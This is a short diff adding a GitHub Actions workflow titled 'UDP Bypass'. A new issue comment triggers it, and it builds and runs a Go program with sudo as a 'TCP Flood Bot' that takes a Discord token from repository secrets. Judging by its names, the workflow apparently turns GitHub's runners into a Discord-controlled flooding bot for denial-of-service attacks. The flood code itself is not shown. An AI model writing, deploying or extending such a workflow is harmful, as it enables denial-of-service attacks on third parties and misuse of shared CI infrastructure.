@@ -1,0 +1,32 @@
+name: UDP Bypass (Go - No Docker)
+
+on:
+  issue_comment:
+    types: [created]
+
+jobs:
+  flood:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Set up Go
+        uses: actions/setup-go@v4
+        with:
+          go-version: '1.21'
+
+      - name: Install dependencies
+        run: go mod download
+
+      - name: Build
+        run: go build -o main .
+
+      - name: Give execute permissions
+        run: chmod +x main
+
+      - name: Run TCP Flood Bot
+        env:
+          DISCORD_TOKEN: ${{ secrets.DISCORD_TOKEN }}
+        run: sudo ./main
+        shell: bash
